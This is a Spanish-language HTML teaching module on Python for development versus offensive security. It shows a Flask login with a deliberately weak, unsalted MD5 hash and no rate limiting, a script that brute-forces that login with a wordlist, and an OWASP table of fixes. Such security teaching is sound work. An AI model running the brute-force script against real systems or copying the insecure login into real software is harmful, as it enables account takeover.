<section style="background: #0a0e14; font-family: 'Fira Code', monospace; color: #c9d1d9; padding: 30px 20px; border-radius: 12px; border: 1px solid #30363d;" isolated="">
    <h2 style="color: #58a6ff; margin-top: 0; font-size: 1.5em;" isolated="">🛡️ Python: Del Desarrollo a la Seguridad Ofensiva</h2>
    
    <div style="margin-bottom: 20px; padding: 15px; border-left: 4px solid #238636; background: rgba(35, 134, 54, 0.1); border-radius: 4px;" isolated="">
        <strong style="color: #3fb950;" isolated="">🎯 Objetivo:</strong>
        <span style="color: #8b949e;"> Comprender cómo Python sirve de puente entre el desarrollo de software y la seguridad ofensiva. Al finalizar, el estudiante podrá identificar las diferencias de paradigma, las librerías clave en cada rama, y reconocer vulnerabilidades comunes en código de producción.</span>
    </div>

    <div style="margin-bottom: 20px; padding: 15px; background: rgba(48, 54, 61, 0.5); border-radius: 8px; border: 1px solid #30363d;" isolated="">
        <h3 style="color: #f0883e; margin-top: 0; font-size: 1.1em;" isolated="">1️⃣ Diferenciación de Paradigmas</h3>
        <table style="width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 10px;" isolated="">
            <thead>
                <tr style="border-bottom: 2px solid #30363d;">
                    <th style="text-align: left; padding: 10px; color: #58a6ff;" isolated="">Dimensión</th>
                    <th style="text-align: left; padding: 10px; color: #3fb950;" isolated="">Desarrollo de Aplicaciones</th>
                    <th style="text-align: left; padding: 10px; color: #f85149;" isolated="">Seguridad Ofensiva</th>
                </tr>
            </thead>
            <tbody>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Propósito</strong></td>
                    <td style="padding: 10px;" isolated="">Construir sistemas funcionales y mantenibles (SDLC)</td>
                    <td style="padding: 10px;" isolated="">Encontrar fallos y explotar vulnerabilidades conocidas (CVE)</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Prioridad</strong></td>
                    <td style="padding: 10px;" isolated="">Legibilidad (PEP8), escalabilidad, mantenibilidad</td>
                    <td style="padding: 10px;" isolated="">Eficacia, sigilo, velocidad de explotación</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Manejo de errores</strong></td>
                    <td style="padding: 10px;" isolated="">Try/except, logging, graceful degradation</td>
                    <td style="padding: 10px;" isolated="">Fail-fast, silencio (no alertar al IDS/SIEM)</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Testing</strong></td>
                    <td style="padding: 10px;" isolated="">Unit tests (pytest), integración, CI/CD</td>
                    <td style="padding: 10px;" isolated="">Pruebas en entorno controlado (lab), reproducción de CVE</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Documentación</strong></td>
                    <td style="padding: 10px;" isolated="">Docstrings, README, Swagger/OpenAPI</td>
                    <td style="padding: 10px;" isolated="">Reporte de hallazgos, PoC, pasos de reproducción</td>
                </tr>
            </tbody>
        </table>
    </div>

    <div style="margin-bottom: 20px; padding: 15px; background: rgba(48, 54, 61, 0.5); border-radius: 8px; border: 1px solid #30363d;" isolated="">
        <h3 style="color: #f0883e; margin-top: 0; font-size: 1.1em;" isolated="">2️⃣ Librerías Clave Comparadas</h3>
        <table style="width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 10px;" isolated="">
            <thead>
                <tr style="border-bottom: 2px solid #30363d;">
                    <th style="text-align: left; padding: 10px; color: #58a6ff;" isolated="">Categoría</th>
                    <th style="text-align: left; padding: 10px; color: #3fb950;" isolated="">Desarrollo</th>
                    <th style="text-align: left; padding: 10px; color: #f85149;" isolated="">Seguridad Ofensiva</th>
                </tr>
            </thead>
            <tbody>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">HTTP/API</strong></td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">requests, httpx, aiohttp</td>
                    <td style="padding: 10px; color: #f85149;" isolated="">requests (manipulación), urllib3, httpx (raw payloads)</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Redes</strong></td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">socket (básico), http.server</td>
                    <td style="padding: 10px; color: #f85149;" isolated="">scapy, socket (raw), pwntools</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Criptografía</strong></td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">hashlib, secrets, cryptography</td>
                    <td style="padding: 10px; color: #f85149;" isolated="">hashlib (cracking), pycryptodome, passlib</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Web Frameworks</strong></td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">FastAPI, Flask, Django</td>
                    <td style="padding: 10px; color: #f85149;" isolated="">Flask (C2 servers), http.server (reverse shells)</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Automatización</strong></td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">subprocess, shutil, pathlib</td>
                    <td style="padding: 10px; color: #f85149;" isolated="">subprocess (recon), os, ctypes (syscall)</td>
                </tr>
                <tr>
                    <td style="padding: 10px; color: #8b949e;" isolated=""><strong isolated="">Testing/Exploit</strong></td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">pytest, unittest, coverage</td>
                    <td style="padding: 10px; color: #f85149;" isolated="">pwntools, impacket, sqlmap API</td>
                </tr>
            </tbody>
        </table>
    </div>

    <div style="margin-bottom: 20px; padding: 15px; background: rgba(48, 54, 61, 0.5); border-radius: 8px; border: 1px solid #30363d;" isolated="">
        <h3 style="color: #f0883e; margin-top: 0; font-size: 1.1em;" isolated="">3️⃣ Caso Práctico: Login System vs Fuerza Bruta</h3>
        <p style="color: #8b949e; font-size: 13px; margin-bottom: 15px;" isolated="">Un desarrollador construye un sistema de autenticación. Un ethical hacker lo audita con un ataque de fuerza bruta.</p>

        <h4 style="color: #3fb950; font-size: 0.95em; margin: 15px 0 8px;" isolated="">🟢 Lado Desarrollo: Sistema de Login (Flask)</h4>
        <pre style="background: #0d1117; padding: 12px; border-radius: 6px; overflow-x: auto; font-size: 12px; border: 1px solid #30363d; line-height: 1.5;" isolated=""><span style="color: #ff7b72;" isolated="">from</span> flask <span style="color: #ff7b72;" isolated="">import</span> Flask, request, jsonify
<span style="color: #ff7b72;" isolated="">import</span> hashlib

app = Flask(__name__)
USERS = {<span style="color: #a5d6ff;" isolated="">"admin"</span>: <span style="color: #a5d6ff;" isolated="">"5f4dcc3b5aa765d61d8327deb882cf99"</span>}

<span style="color: #8b949e;" isolated="">@app</span>.route(<span style="color: #a5d6ff;" isolated="">"/login"</span>, methods=[<span style="color: #a5d6ff;" isolated="">"POST"</span>])
<span style="color: #ff7b72;" isolated="">def</span> <span style="color: #d2a8ff;" isolated="">login</span>():
    data = request.get_json()
    user = data.get(<span style="color: #a5d6ff;" isolated="">"username"</span>)
    pwd_hash = hashlib.md5(data.get(<span style="color: #a5d6ff;" isolated="">"password"</span>).encode()).hexdigest()
    
    <span style="color: #ff7b72;" isolated="">if</span> user <span style="color: #ff7b72;" isolated="">in</span> USERS <span style="color: #ff7b72;" isolated="">and</span> USERS[user] == pwd_hash:
        <span style="color: #ff7b72;" isolated="">return</span> jsonify({<span style="color: #a5d6ff;" isolated="">"status"</span>: <span style="color: #a5d6ff;" isolated="">"ok"</span>}), <span style="color: #79c0ff;" isolated="">200</span>
    <span style="color: #ff7b72;" isolated="">return</span> jsonify({<span style="color: #a5d6ff;" isolated="">"status"</span>: <span style="color: #a5d6ff;" isolated="">"denied"</span>}), <span style="color: #79c0ff;" isolated="">401</span>
</pre>

        <h4 style="color: #f85149; font-size: 0.95em; margin: 15px 0 8px;" isolated="">🔴 Lado Seguridad: Auditoría de Fuerza Bruta</h4>
        <pre style="background: #0d1117; padding: 12px; border-radius: 6px; overflow-x: auto; font-size: 12px; border: 1px solid #30363d; line-height: 1.5;" isolated=""><span style="color: #ff7b72;" isolated="">import</span> requests
<span style="color: #ff7b72;" isolated="">import</span> hashlib
<span style="color: #ff7b72;" isolated="">from</span> itertools <span style="color: #ff7b72;" isolated="">import</span> islice

TARGET = <span style="color: #a5d6ff;" isolated="">"http://192.168.1.105:5000/login"</span>
WORDLIST = <span style="color: #a5d6ff;" isolated="">"/usr/share/wordlists/rockyou.txt"</span>

<span style="color: #8b949e;" isolated=""># Propósito educativo: demostrar por qué MD5 es inseguro</span>
<span style="color: #ff7b72;" isolated="">def</span> <span style="color: #d2a8ff;" isolated="">brute_force</span>(wordlist_path):
    <span style="color: #ff7b72;" isolated="">with</span> <span style="color: #79c0ff;" isolated="">open</span>(wordlist_path) <span style="color: #ff7b72;" isolated="">as</span> f:
        <span style="color: #ff7b72;" isolated="">for</span> line <span style="color: #ff7b72;" isolated="">in</span> islice(f, <span style="color: #79c0ff;" isolated="">1000</span>):  <span style="color: #8b949e;" isolated=""># Limitado para demo</span>
            pwd = line.strip()
            h = hashlib.md5(pwd.encode()).hexdigest()
            r = requests.post(TARGET, json={
                <span style="color: #a5d6ff;" isolated="">"username"</span>: <span style="color: #a5d6ff;" isolated="">"admin"</span>,
                <span style="color: #a5d6ff;" isolated="">"password"</span>: pwd
            })
            <span style="color: #ff7b72;" isolated="">if</span> r.status_code == <span style="color: #79c0ff;" isolated="">200</span>:
                <span style="color: #ff7b72;" isolated="">print</span>(<span style="color: #a5d6ff;" isolated="">f"[+] Password found: </span>{pwd}<span style="color: #a5d6ff;" isolated="">"</span>)
                <span style="color: #ff7b72;" isolated="">return</span> pwd
    <span style="color: #ff7b72;" isolated="">print</span>(<span style="color: #a5d6ff;" isolated="">"[-] Not found in sample"</span>)

brute_force(WORDLIST)
</pre>
    </div>

    <div style="margin-bottom: 20px; padding: 15px; background: rgba(48, 54, 61, 0.5); border-radius: 8px; border: 1px solid #30363d;" isolated="">
        <h3 style="color: #f0883e; margin-top: 0; font-size: 1.1em;" isolated="">4️⃣ Análisis de Riesgos (OWASP Top 10)</h3>
        <table style="width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 10px;" isolated="">
            <thead>
                <tr style="border-bottom: 2px solid #30363d;">
                    <th style="text-align: left; padding: 10px; color: #58a6ff;" isolated="">Vulnerabilidad</th>
                    <th style="text-align: left; padding: 10px; color: #f85149;" isolated="">CWE</th>
                    <th style="text-align: left; padding: 10px; color: #8b949e;" isolated="">Problema en el código</th>
                    <th style="text-align: left; padding: 10px; color: #3fb950;" isolated="">Mitigación</th>
                </tr>
            </thead>
            <tbody>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #f85149;" isolated="">Hash inseguro (MD5)</td>
                    <td style="padding: 10px;" isolated="">CWE-327</td>
                    <td style="padding: 10px; color: #8b949e;" isolated="">MD5 es rápido de crackear (~10B hashes/s en GPU)</td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">Usar bcrypt o argon2 con salt</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #f85149;" isolated="">Sin rate limiting</td>
                    <td style="padding: 10px;" isolated="">CWE-307</td>
                    <td style="padding: 10px; color: #8b949e;" isolated="">No hay límite de intentos por IP o usuario</td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">Flask-Limiter: 5 intentos/minuto</td>
                </tr>
                <tr style="border-bottom: 1px solid #21262d;">
                    <td style="padding: 10px; color: #f85149;" isolated="">Mensaje genérico</td>
                    <td style="padding: 10px;" isolated="">CWE-203</td>
                    <td style="padding: 10px; color: #8b949e;" isolated="">"denied" confirma que la ruta existe</td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">Mensaje idéntico para usuario o contraseña incorrecta</td>
                </tr>
                <tr>
                    <td style="padding: 10px; color: #f85149;" isolated="">Sin CSRF token</td>
                    <td style="padding: 10px;" isolated="">CWE-352</td>
                    <td style="padding: 10px; color: #8b949e;" isolated="">Endpoint POST sin verificación de origen</td>
                    <td style="padding: 10px; color: #3fb950;" isolated="">Flask-WTF CSRF Protect</td>
                </tr>
            </tbody>
        </table>
    </div>

    <div style="padding: 15px; background: rgba(35, 134, 54, 0.1); border-radius: 8px; border: 1px solid #238636;" isolated="">
        <h3 style="color: #3fb950; margin-top: 0; font-size: 1.1em;" isolated="">⚖️ Rúbrica de Evaluación</h3>
        <ul style="margin: 10px 0; padding-left: 20px; list-style-type: square; color: #c9d1d9; font-size: 13px;" isolated="">
            <li isolated=""><strong style="color: #58a6ff;" isolated="">25% — Diferenciación:</strong> Explicar 3 diferencias entre código de desarrollo y script de seguridad.</li>
            <li isolated=""><strong style="color: #58a6ff;" isolated="">25% — Librerías:</strong> Identificar 3 librerías de cada rama y su propósito.</li>
            <li isolated=""><strong style="color: #58a6ff;" isolated="">25% — Análisis de riesgos:</strong> Identificar al menos 2 vulnerabilidades OWASP en código dado.</li>
            <li isolated=""><strong style="color: #58a6ff;" isolated="">25% — Mitigación:</strong> Proponer solución concreta para cada vulnerabilidad encontrada.</li>
        </ul>
        <p style="color: #8b949e; font-size: 12px; margin-top: 12px; padding-top: 12px; border-top: 1px solid #21262d;" isolated="">
            ⚠️ <strong style="color: #f85149;" isolated="">Aviso:</strong> Todo el código de seguridad en este módulo es estrictamente pedagógico. Su uso está limitado a entornos de laboratorio autorizados (CTF, VMs de práctica, auditorías con consentimiento).
        </p>
    </div>
</section>